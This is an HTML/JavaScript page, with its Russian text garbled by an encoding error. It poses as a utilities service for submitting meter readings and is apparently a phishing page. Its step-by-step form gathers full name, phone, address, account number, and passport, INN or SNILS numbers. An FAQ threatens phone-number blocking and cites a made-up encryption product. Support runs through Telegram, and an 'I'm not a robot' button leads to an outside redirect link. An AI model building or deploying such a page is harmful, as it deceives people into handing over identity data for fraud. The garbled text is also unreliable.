<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ñ–ö–• ‚Äî –ø–µ—Ä–µ–¥–∞—á–∞ –ø–æ–∫–∞–∑–∞–Ω–∏–π</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      padding: 20px;
      display: flex;
      justify-content: center;
    }

    .container {
      max-width: 600px;
      width: 100%;
      margin: auto;
      background: #fff;
      padding: 25px;
      border-radius: 14px;
      box-shadow: 0 3px 12px rgba(0,0,0,0.18);
    }

    .step {
      display: none;
    }

    .step.active {
      display: block;
    }

    h2, h3 {
      margin-bottom: 12px;
      font-weight: 700;
      font-size: 1.5em;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
    }

    .buttons {
      margin-top: 18px;
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
    }

    button {
      width: 100%;
      max-width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      text-align: center;
      box-sizing: border-box;
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .next {
      background: #007bff;
      color: #fff;
    }

    .back {
      background: #6c757d;
      color: #fff;
    }

    .doc-btn, .service-btn, .faq-btn {
      background: #17a2b8;
      color: #fff;
      flex: 1;
      text-align: center;
    }

    .error {
      color: red;
      font-size: 15px;
      margin-top: 6px;
      font-weight: 600;
    }

    small {
      color: #555;
      display: block;
      margin-top: 6px;
      font-size: 14px;
    }

    a button {
      width: 100%;
    }

    .data-review {
      margin-bottom: 18px;
      color: #333;
      font-size: 15px;
      line-height: 1.5;
    }

    .data-history table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 18px;
    }

    .data-history th, .data-history td {
      border: 1px solid #ccc;
      padding: 10px;
      text-align: left;
      font-size: 14px;
    }

    .data-history th {
      background: #f8f9fa;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="container">
    <form id="wizardForm">

      <!-- –í—Å—Ç—É–ø–ª–µ–Ω–∏–µ -->
      <div class="step active">
        <h2>üè† –ñ–ö–• ‚Äî –æ–Ω–ª–∞–π–Ω</h2>
        <p>üíß –ü–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –ø–æ–∫–∞–∑–∞–Ω–∏—è –ø—Ä—è–º–æ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞.</p>
        <p>‚ö° –í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.</p>
        <p>üëã –ù–∞–∂–º–∏—Ç–µ ¬´–î–∞–ª–µ–µ¬ª, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å.</p>
        <div class="buttons">
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
          <button type="button" class="service-btn" data-service="additional">üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏</button>
          <button type="button" class="service-btn" data-service="history">üìú –ò—Å—Ç–æ—Ä–∏—è –¥–∞–Ω–Ω—ã—Ö</button>
        </div>
      </div>

      <!-- –§–ò–û -->
      <div class="step">
        <h3>üë§ –í–≤–µ–¥–∏—Ç–µ –§–ò–û</h3>
        <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" required>
        <div class="error" id="err-fullname"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –¢–µ–ª–µ—Ñ–æ–Ω -->
      <div class="step">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <input type="tel" id="phone" placeholder="+79991234567" required>
        <div class="error" id="err-phone"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ê–¥—Ä–µ—Å -->
      <div class="step">
        <h3>üè† –ê–¥—Ä–µ—Å</h3>
        <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1" required>
        <div class="error" id="err-address"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç -->
      <div class="step">
        <h3>üí≥ –õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç</h3>
        <input type="text" id="account" placeholder="1234567890" required>
        <div class="error" id="err-account"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –í—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button type="button" class="doc-btn" data-doc="passport">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="doc-btn" data-doc="inn">üßæ –ò–ù–ù</button>
          <button type="button" class="doc-btn" data-doc="snils">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
      <div class="step">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
        <input type="text" id="docnumber" required>
        <div class="error" id="err-doc"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏ -->
      <div class="step">
        <h3>üõ†Ô∏è –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —É—Å–ª—É–≥–∏</h3>
        <div class="buttons">
          <button type="button" class="service-btn" data-service="faq">‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
          <button type="button" class="service-btn" data-service="instruction">‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</button>
          <a href="https://t.me/MyPhoenlxsupport" target="_blank">
            <button type="button" class="service-btn">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          </a>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã -->
      <div class="step">
        <h3>‚ùì –ß–∞—Å—Ç–æ –∑–∞–¥–∞–≤–∞–µ–º—ã–µ –≤–æ–ø—Ä–æ—Å—ã</h3>
        <div class="buttons">
          <button type="button" class="faq-btn" data-faq="penalty">üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑-–∑–∞ –Ω–µ–∞–∫—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏</button>
          <button type="button" class="faq-btn" data-faq="safe">üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?</button>
          <button type="button" class="faq-btn" data-faq="telegram">‚ö°Ô∏è –ü–æ—á–µ–º—É —á–µ—Ä–µ–∑ Telegram?</button>
          <button type="button" class="faq-btn" data-faq="documents">üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?</button>
          <button type="button" class="faq-btn" data-faq="fix">üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?</button>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –û—Ç–≤–µ—Ç—ã –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã -->
      <div class="step">
        <h3 id="faq-title">‚ùì –û—Ç–≤–µ—Ç</h3>
        <div id="faq-answer" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è -->
      <div class="step">
        <h3>‚ÑπÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</h3>
        <div style="margin-bottom:8px;color:#333;font-size:15px;">
          üìã –ß—Ç–æ–±—ã –æ–±–Ω–æ–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ:<br>
          1Ô∏è‚É£ –ù–∞–∂–º–∏—Ç–µ ¬´–î–∞–ª–µ–µ¬ª –Ω–∞ –≥–ª–∞–≤–Ω–æ–º —ç–∫—Ä–∞–Ω–µ.<br>
          2Ô∏è‚É£ –í–≤–µ–¥–∏—Ç–µ –§–ò–û, –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –∞–¥—Ä–µ—Å –∏ –ª–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç.<br>
          3Ô∏è‚É£ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏ –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä.<br>
          4Ô∏è‚É£ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç.
        </div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö -->
      <div class="step">
        <h3>üìã –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö</h3>
        <div class="data-review" id="data-review"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <!-- –ò—Å—Ç–æ—Ä–∏—è –¥–∞–Ω–Ω—ã—Ö -->
      <div class="step">
        <h3>üìú –ò—Å—Ç–æ—Ä–∏—è –¥–∞–Ω–Ω—ã—Ö</h3>
        <div class="data-history" id="data-history"></div>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

      <!-- –§–∏–Ω–∞–ª -->
      <div class="step">
        <h3>‚úÖ –í—Å—ë –≥–æ—Ç–æ–≤–æ!</h3>
        <p>–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ –∏ –∑–∞–≤–µ—Ä—à–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ–º:</p>
        <a href="https://redirect.figma.site/" target="_blank">
          <button type="button" class="next">–Ø –Ω–µ —Ä–æ–±–æ—Ç ‚úÖ</button>
        </a>
        <div class="buttons">
          <button type="button" class="back">‚¨ÖÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
      </div>

    </form>
  </div>

  <script>
    const steps = document.querySelectorAll('.step');
    let currentStep = 0;
    let selectedDoc = null;
    let formData = {
      fullname: '',
      phone: '',
      address: '',
      account: '',
      document_type: '',
      document_number: ''
    };
    let dataHistory = [];

    // Load data from localStorage on page load
    function loadFormData() {
      const savedData = localStorage.getItem('formData');
      if (savedData) {
        formData = JSON.parse(savedData);
      }
      const savedHistory = localStorage.getItem('dataHistory');
      if (savedHistory) {
        dataHistory = JSON.parse(savedHistory);
      } else {
        // –ò–º–∏—Ç–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö –∏–∑ Telegram-–±–æ—Ç–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        dataHistory = [
          {
            timestamp: '2025-09-04 14:00:00',
            fullname: '–ü–µ—Ç—Ä–æ–≤ –ü—ë—Ç—Ä –ü–µ—Ç—Ä–æ–≤–∏—á',
            phone: '+79991234567',
            address: '–≥. –°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥, —É–ª. –ù–µ–≤—Å–∫–∏–π, –¥. 10',
            account: '1234567890',
            document_type: '–ü–∞—Å–ø–æ—Ä—Ç',
            document_number: '4501 123456'
          },
          {
            timestamp: '2025-09-04 13:30:00',
            fullname: '–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á',
            phone: '+79881234567',
            address: '–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1',
            account: '9876543210',
            document_type: '–ò–ù–ù',
            document_number: '500100732259'
          }
        ];
        localStorage.setItem('dataHistory', JSON.stringify(dataHistory));
      }
    }

    // Save data to localStorage
    function saveFormData() {
      localStorage.setItem('formData', JSON.stringify(formData));
    }

    // Save to history
    function saveToHistory() {
      const timestamp = new Date().toLocaleString('ru-RU');
      dataHistory.push({ ...formData, timestamp });
      localStorage.setItem('dataHistory', JSON.stringify(dataHistory));
    }

    // Display form data in the review step
    function displayFormData() {
      const reviewDiv = document.getElementById('data-review');
      reviewDiv.innerHTML = `
        <strong>–§–ò–û:</strong> ${formData.fullname || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}<br>
        <strong>–¢–µ–ª–µ—Ñ–æ–Ω:</strong> ${formData.phone || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}<br>
        <strong>–ê–¥—Ä–µ—Å:</strong> ${formData.address || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}<br>
        <strong>–õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç:</strong> ${formData.account || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}<br>
        <strong>–î–æ–∫—É–º–µ–Ω—Ç:</strong> ${formData.document_type || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'} ${formData.document_number || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}
      `;
    }

    // Display history data in the history step
    function displayHistoryData() {
      const historyDiv = document.getElementById('data-history');
      if (dataHistory.length === 0) {
        historyDiv.innerHTML = '<p>–ù–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.</p>';
        return;
      }
      let table = `
        <table>
          <tr>
            <th>–î–∞—Ç–∞</th>
            <th>–§–ò–û</th>
            <th>–¢–µ–ª–µ—Ñ–æ–Ω</th>
            <th>–ê–¥—Ä–µ—Å</th>
            <th>–õ–∏—Ü–µ–≤–æ–π —Å—á—ë—Ç</th>
            <th>–î–æ–∫—É–º–µ–Ω—Ç</th>
          </tr>
      `;
      dataHistory.forEach(record => {
        table += `
          <tr>
            <td>${record.timestamp}</td>
            <td>${record.fullname || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}</td>
            <td>${record.phone || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}</td>
            <td>${record.address || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}</td>
            <td>${record.account || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}</td>
            <td>${record.document_type || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'} ${record.document_number || '–ù–µ —É–∫–∞–∑–∞–Ω–æ'}</td>
          </tr>
        `;
      });
      table += '</table>';
      historyDiv.innerHTML = table;
    }

    // Initialize form data
    loadFormData();

    function showStep(n) {
      steps.forEach((s, i) => s.classList.toggle('active', i === n));
      currentStep = n;
      if (currentStep === 11) { // Review Data step
        displayFormData();
      } else if (currentStep === 12) { // History Data step
        displayHistoryData();
      }
    }

    document.querySelectorAll('.next').forEach(btn => {
      btn.addEventListener('click', () => {
        if (!validateStep(currentStep)) return;
        if (currentStep === 6) { // After Document Number
          saveToHistory(); // Save to history before moving to review
        }
        if (currentStep < steps.length - 1) showStep(currentStep + 1);
      });
    });

    document.querySelectorAll('.back').forEach(btn => {
      btn.addEventListener('click', () => {
        if (currentStep > 0) {
          // Special handling for back navigation
          if (currentStep === 13) { // Final step
            showStep(11); // Back to Review Data
          } else if (currentStep === 12) { // History Data
            showStep(0); // Back to Intro
          } else if (currentStep === 11) { // Review Data
            showStep(6); // Back to Document Number
          } else if (currentStep === 10) { // Instruction
            showStep(7); // Back to Additional Services
          } else if (currentStep === 9) { // FAQ Answer
            showStep(8); // Back to FAQ
          } else if (currentStep === 8) { // FAQ
            showStep(7); // Back to Additional Services
          } else if (currentStep === 7) { // Additional Services
            showStep(0); // Back to Intro
          } else {
            showStep(currentStep - 1);
          }
        }
      });
    });

    document.querySelectorAll('.doc-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        selectedDoc = btn.dataset.doc;
        formData.document_type = selectedDoc === 'passport' ? '–ü–∞—Å–ø–æ—Ä—Ç' : selectedDoc === 'inn' ? '–ò–ù–ù' : '–°–ù–ò–õ–°';
        const docnumber = document.getElementById('docnumber');
        const example = document.getElementById('doc-example');

        if (selectedDoc === "passport") {
          docnumber.pattern = "^\\d{4}\\s\\d{6}$";
          example.textContent = "–ü—Ä–∏–º–µ—Ä –ø–∞—Å–ø–æ—Ä—Ç–∞: 4510 123456";
        }

        if (selectedDoc === "inn") {
          docnumber.pattern = "^\\d{10}(\\d{2})?$";
          example.textContent = "–ü—Ä–∏–º–µ—Ä –ò–ù–ù: 500100732259";
        }

        if (selectedDoc === "snils") {
          docnumber.pattern = "^\\d{3}-\\d{3}-\\d{3}\\s\\d{2}$";
          example.textContent = "–ü—Ä–∏–º–µ—Ä –°–ù–ò–õ–°: 112-233-445 95";
        }

        saveFormData();
        showStep(currentStep + 1);
      });
    });

    document.querySelectorAll('.service-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const service = btn.dataset.service;
        if (service === "additional") {
          showStep(7); // Additional Services
        } else if (service === "faq") {
          showStep(8); // FAQ
        } else if (service === "instruction") {
          showStep(10); // Instruction
        } else if (service === "history") {
          showStep(12); // History Data
        }
      });
    });

    document.querySelectorAll('.faq-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const faq = btn.dataset.faq;
        const answer = document.getElementById('faq-answer');
        const title = document.getElementById('faq-title');

        if (faq === "penalty") {
          title.textContent = "üö´ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞";
          answer.textContent = "‚ö†Ô∏è –ï—Å–ª–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–µ –æ–±–Ω–æ–≤–ª—ë–Ω –≤–æ–≤—Ä–µ–º—è, –æ–Ω –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –¥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∞–∫—Ç—É–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö. üî•";
        } else if (faq === "safe") {
          title.textContent = "üîí –≠—Ç–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ?";
          answer.textContent = "üîê –î–∞, —É –Ω–∞—Å —Å—Ç–æ–∏—Ç –∑–∞—â–∏—Ç–∞ VISION 3.87676 PRO VS (—Å–∫–≤–æ–∑–Ω–æ–µ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ). üî•";
        } else if (faq === "telegram") {
          title.textContent = "‚ö°Ô∏è –ü–æ—á–µ–º—É —á–µ—Ä–µ–∑ Telegram?";
          answer.textContent = "‚ö°Ô∏è –î–ª—è —É–¥–æ–±—Å—Ç–≤–∞ –∏ –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –ø–ª–æ—â–∞–¥–∫–∏. üî•";
        } else if (faq === "documents") {
          title.textContent = "üìë –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?";
          answer.textContent = "üëâ –ü–∞—Å–ø–æ—Ä—Ç, –ò–ù–ù, –°–ù–ò–õ–°. üî•";
        } else if (faq === "fix") {
          title.textContent = "üîÅ –ú–æ–∂–Ω–æ –ª–∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É?";
          answer.textContent = "‚úÖ –î–∞, –º–æ–∂–Ω–æ. –°–≤—è–∂–∏—Ç–µ—Å—å —Å —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –≤–≤–æ–¥. üî•";
        }

        showStep(9); // FAQ Answer
      });
    });

    function validateStep(step) {
      let val, re;

      if (step === 1) {
        val = document.getElementById('fullname').value.trim();
        re = /^[–ê-–Ø–Å][–∞-—è—ë]+\s[–ê-–Ø–Å][–∞-—è—ë]+\s[–ê-–Ø–Å][–∞-—è—ë]+$/;
        if (!re.test(val)) {
          document.getElementById('err-fullname').textContent = "–í–≤–µ–¥–∏—Ç–µ –§–ò–û –ø–æ–ª–Ω–æ—Å—Ç—å—é –∫–∏—Ä–∏–ª–ª–∏—Ü–µ–π";
          return false;
        }
        document.getElementById('err-fullname').textContent = "";
        formData.fullname = val;
        saveFormData();
        return true;
      }

      if (step === 2) {
        val = document.getElementById('phone').value.trim();
        re = /^(\+7|7)\d{10}$/;
        if (!re.test(val)) {
          document.getElementById('err-phone').textContent = "–¢–µ–ª–µ—Ñ–æ–Ω –≤ —Ñ–æ—Ä–º–∞—Ç–µ +79991234567";
          return false;
        }
        document.getElementById('err-phone').textContent = "";
        formData.phone = val;
        saveFormData();
        return true;
      }

      if (step === 3) {
        val = document.getElementById('address').value.trim();
        if (val.length < 5) {
          document.getElementById('err-address').textContent = "–ê–¥—Ä–µ—Å —Å–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π";
          return false;
        }
        document.getElementById('err-address').textContent = "";
        formData.address = val;
        saveFormData();
        return true;
      }

      if (step === 4) {
        val = document.getElementById('account').value.trim();
        re = /^\d{6,12}$/;
        if (!re.test(val)) {
          document.getElementById('err-account').textContent = "–°—á—ë—Ç 6-12 —Ü–∏—Ñ—Ä";
          return false;
        }
        document.getElementById('err-account').textContent = "";
        formData.account = val;
        saveFormData();
        return true;
      }

      if (step === 6) {
        val = document.getElementById('docnumber').value.trim();
        re = new RegExp(document.getElementById('docnumber').pattern);
        if (!re.test(val)) {
          document.getElementById('err-doc').textContent = "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞";
          return false;
        }
        document.getElementById('err-doc').textContent = "";
        formData.document_number = val;
        saveFormData();
        return true;
      }

      return true;
    }
  </script>
</body>
</html>
